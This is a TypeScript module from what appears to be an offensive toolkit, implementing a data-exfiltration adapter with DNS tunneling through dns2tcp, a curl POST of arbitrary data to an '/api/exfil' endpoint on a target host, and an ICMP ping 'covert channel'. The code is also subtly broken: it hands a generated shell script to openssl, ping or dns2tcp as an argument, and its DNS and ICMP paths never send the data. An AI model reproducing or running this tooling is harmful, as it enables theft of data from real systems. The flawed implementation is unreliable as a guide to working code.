/**
 * OffSec by True Hacking — Adapter: Exfiltration (DNS, HTTPS, ICMP, tunneling).
 *
 * Exfiltrates data (DNS tunneling, HTTPS encrypted, ICMP covert).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Data exfiltration (DNS, HTTPS, ICMP, tunneling).
 *
 * @param options - Exfiltration options (target, data, method).
 */
export function exfiltration(options: {
  target: string;
  data: string;
  method?: string;  // dns, https, icmp, tcp
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const data = options.data;
  const method = options.method || "dns";
  const results: Record<string, any> = {};

  // DNS tunneling (exfiltrate via DNS queries).
  if (method === "dns") {
    const dnsPath = findBinary("dns2tcp");
    if (dnsPath) {
      const commands = [`dns2tcp -f -s ${target}`];  // (DNS tunnel).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dnsPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.dns = String(child.stdout ?? "");
    } else {
      results.dns = `{stub: no 'dns2tcp' binary (install: apt install dns2tcp).}`;
    }
  }

  // HTTPS (encrypted exfiltration via HTTPS).
  if (method === "https") {
    const sslPath = findBinary("openssl");
    if (sslPath) {
      const commands = [`curl -X POST -H "Content-Type: application/octet-stream" -d "${data}" https://${target}/api/exfil`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(sslPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.https = String(child.stdout ?? "");
    } else {
      results.https = `{stub: no 'curl' or 'openssl' binary (install: brew install openssl).}`;
    }
  }

  // ICMP (covert channel via ICMP ping packets).
  if (method === "icmp") {
    const pingPath = findBinary("ping");
    if (pingPath) {
      const commands = [`ping -c 100 -i 0.1 ${target} -s 56`];  // (ICMP covert channel).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(pingPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.icmp = String(child.stdout ?? "");
    } else {
      results.icmp = `{stub: no 'ping' binary (install: brew install iputils or apt install iputils).}`;
    }
  }

  return {
    target,
    payload: `exfiltration/${method}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("exfiltration", `exfiltration://${target}/${method}`),
  };
}

/** Find the binary (dns2tcp/openssl/ping/curl). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
